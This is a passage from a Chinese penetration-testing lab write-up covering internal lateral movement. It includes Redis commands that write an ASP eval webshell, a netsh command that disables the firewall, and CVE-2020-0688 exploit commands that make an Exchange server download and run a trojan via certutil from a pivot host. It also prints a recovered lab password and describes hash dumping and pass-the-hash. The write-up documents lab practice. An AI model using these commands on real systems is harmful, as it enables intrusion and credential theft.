+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525163943191.png" alt="image-20220525163943191"></p>
+<p>既然192.168.189.162有web服务，那么直接写webshell，用iis默认网站根路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> C:/inetpub/wwwroot</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&quot;&lt;%eval request(\&quot;sq\&quot;)%&gt;&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.asp</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525164814315.png" alt="image-20220525164814315"></p>
+<p>蚁剑设置代理连接</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525164722465.png" alt="image-20220525164722465"></p>
+<p>老规矩查杀软，很良心，没杀软</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525164917047.png" alt="image-20220525164917047"></p>
+<p>直接上线cs</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525165052553.png" alt="image-20220525165052553"></p>
+<p>192.168.189.162目标信息收集</p>
+<p>Windows Server 2012的机器</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525165146447.png" alt="image-20220525165146447"></p>
+<p>土豆一把嗦</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525165237293.png" alt="image-20220525165237293"></p>
+<p>查看网络配置发现10.10.10.0&#x2F;24网段</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525182421990.png" alt="image-20220525182421990"></p>
+<p>探测10.10.10.0&#x2F;24存活，10.10.10.209目标有web服务</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525184151977.png" alt="image-20220525184151977"></p>
+<p>socks代理访问<a target="_blank" rel="noopener" href="https://10.10.10.209发现是exchange服务/">https://10.10.10.209发现是Exchange服务</a></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525182520543.png" alt="image-20220525182520543"></p>
+<p>在redis目标机器上发现了pst文件（outlook的数据库文件，主要是用来存放用户邮件、联系人及其它相关的资料。）</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525173903653.png" alt="image-20220525173903653"></p>
+<p>下载下来用outlook打开发现一个登陆账户以及密码moonsec:QQqq5201314</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525174008829.png" alt="image-20220525174008829"></p>
+<p>使用<strong>moonsec:QQqq5201314</strong>成功登陆Exchange</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525182746070.png" alt="image-20220525182746070"></p>
+<h3 id="Exchange-RCE-CVE-2020-0688"><a href="#Exchange-RCE-CVE-2020-0688" class="headerlink" title="Exchange RCE CVE-2020-0688"></a>Exchange RCE CVE-2020-0688</h3><p>经测试该版本Exchange服务器存在CVE-2020-0688，直接使用exp攻击即可</p>
+<p>首先添加一个监听，监听redis那台机器，由于Exchange这台机器不出网，所以要做转发上线</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525185825620.png" alt="image-20220525185825620"></p>
+<p>关闭redis这台机器的防火墙</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190051498.png" alt="image-20220525190051498"></p>
+<p>生成stageless类型的木马文件上传到redis那台机器的web根目录下</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525185937711.png" alt="image-20220525185937711"></p>
+<p>使用exp攻击Exchange服务让目标机器下载be.exe木马文件并执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python exp.py <span class="literal">-t</span> https://<span class="number">10.10</span>.<span class="number">10.209</span> <span class="literal">-u</span> cncat\\moonsec <span class="literal">-p</span> QQqq5201314 <span class="literal">-c</span> <span class="string">&quot;cmd/c certutil -urlcache -split -f http://10.10.10.128/be.exe c:/be.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190208416.png" alt="image-20220525190208416"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python exp1.py <span class="literal">-t</span> https://<span class="number">10.10</span>.<span class="number">10.209</span> <span class="literal">-u</span> cncat\\moonsec <span class="literal">-p</span> QQqq5201314 <span class="literal">-c</span> <span class="string">&quot;cmd/c c:/be.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190217672.png" alt="image-20220525190217672"></p>
+<p>Exchange服务器上线</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190248697.png" alt="image-20220525190248697"></p>
+<p>抓一波账户密码hash，抓到了DC的hash</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190350985.png" alt="image-20220525190350985"></p>
+<h3 id="DC上线"><a href="#DC上线" class="headerlink" title="DC上线"></a>DC上线</h3><p>ipconfig 查看网络配置，发现当前机器处于域内</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190555554.png" alt="image-20220525190555554"></p>
+<p>定位域控</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190654506.png" alt="image-20220525190654506"></p>
+<p>pth DC上线</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525190927658.png" alt="image-20220525190927658"></p>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525203555428.png" alt="image-20220525203555428"></p>
+<p>打DC的话其实用zerologon会更快一点，奈何本菜鸡很少打过Exchange，还是熟悉一下。</p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">靶场拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E8%80%83%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">网站源码备份文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">数据库备份获得管理员账户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">SQL注入获得管理员账户密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6Getshll"><span class="toc-number">4.</span> <span class="toc-text">修改网站配置文件Getshll</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-Disable-Function"><span class="toc-number">4.1.</span> <span class="toc-text">Bypass Disable Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass%E7%81%AB%E7%BB%92%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">4.2.</span> <span class="toc-text">Bypass火绒上线CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">6.</span> <span class="toc-text">内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%86%99webshell"><span class="toc-number">6.1.</span> <span class="toc-text">redis写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exchange-RCE-CVE-2020-0688"><span class="toc-number">6.2.</span> <span class="toc-text">Exchange RCE CVE-2020-0688</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC%E4%B8%8A%E7%BA%BF"><span class="toc-number">6.3.</span> <span class="toc-text">DC上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">7.</span> <span class="toc-text">结束</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/2648142726/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/2648142726/&text=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/2648142726/&is_video=false&description=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从外网打点到内网域实战 - cncat WriteUp&body=Check out this article: http://example.com/posts/2648142726/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/2648142726/&name=从外网打点到内网域实战 - cncat WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/2648142726/&t=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    1in3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
